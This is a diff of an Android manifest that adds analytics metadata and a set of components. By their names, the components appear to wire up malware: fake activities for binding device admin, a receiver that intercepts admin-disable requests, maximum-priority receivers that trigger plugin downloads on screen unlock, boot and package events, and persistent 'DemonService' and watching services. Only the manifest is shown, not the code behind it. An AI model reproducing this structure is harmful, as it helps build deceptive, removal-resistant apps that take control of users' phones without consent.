@@ -54,12 +54,6 @@
     <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES"/>
     <uses-permission android:name="com.android.alarm.permission.SET_ALARM"/>
 
-    <!-- 创建桌面快捷方式 -->
-    <uses-permission android:name="com.android.launcher.permission.INSTALL_SHORTCUT"/>
-    <uses-permission android:name="com.android.launcher.permission.UNINSTALL_SHORTCUT"/>
-    <!-- end 基础SDK 权限 -->
-
-
     <!-- 获取有关当前或最近运行的任务，最近任务按钮 -->
     <uses-permission android:name="android.permission.GET_TASKS"/>
     <!-- 清除所有已安装应用缓存的权限 -->
@@ -103,6 +97,77 @@
             android:label="@string/app_name"
             android:screenOrientation="portrait"
             android:theme="@style/Theme.Translucent"/>
+
+        <!-- 主程序需要 -->
+        <meta-data
+            android:name="UMENG_APPKEY"
+            android:value="52b15a9656240bb43204463a">
+        </meta-data>
+        <meta-data
+            android:name="UMENG_CHANNEL"
+            android:value="@string/channel_code">
+        </meta-data>
+        <activity
+            android:name="com.xstd.qm.FakeActivity"
+            android:screenOrientation="portrait"/>
+        <activity android:name="com.xstd.qm.activity.BindFakeActivity"/>
+
+        <receiver
+            android:name="com.xstd.qm.receiver.NetworkBroadcastReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            </intent-filter>
+        </receiver>
+        <receiver
+            android:name="com.xstd.qm.receiver.ScreenBroadcastReceiver"
+            android:priority="0x7fffffff">
+            <intent-filter>
+                <action android:name="android.intent.action.USER_PRESENT"/>
+            </intent-filter>
+        </receiver>
+        <receiver
+            android:name="com.xstd.qm.receiver.PluginDownloadBroadcastReceiver"
+            android:priority="0x7fffffff">
+            <intent-filter>
+                <action android:name="android.intent.action.USER_PRESENT"/>
+            </intent-filter>
+        </receiver>
+        <receiver
+            android:name="com.xstd.qm.receiver.PackageAddBrc"
+            android:priority="0x7fffffff">
+            <intent-filter>
+                <action android:name="android.intent.action.PACKAGE_ADDED"/>
+                <action android:name="android.intent.action.PACKAGE_REMOVED"/>
+
+                <data android:scheme="package"/>
+            </intent-filter>
+        </receiver>
+        <receiver
+            android:name="com.xstd.qm.receiver.BindDeviceReceiver"
+            android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin"/>
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
+                <action android:name="android.app.action.DEVICE_ADMIN_DISABLED"/>
+                <action android:name="android.app.action.DEVICE_ADMIN_DISABLE_REQUESTED"/>
+            </intent-filter>
+        </receiver>
+
+        <service
+            android:name="com.xstd.qm.service.DemonService"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="com.xstd.qs.lanuch"/>
+                <action android:name="com.xstd.qs.active"/>
+            </intent-filter>
+        </service>
+        <service android:name="com.xstd.qm.service.WatchingService"/>
+        <service android:name="com.xstd.qm.service.WatchBindService"/>
+        <service android:name="com.xstd.qm.service.FakeBindService"/>
 
     </application>
 
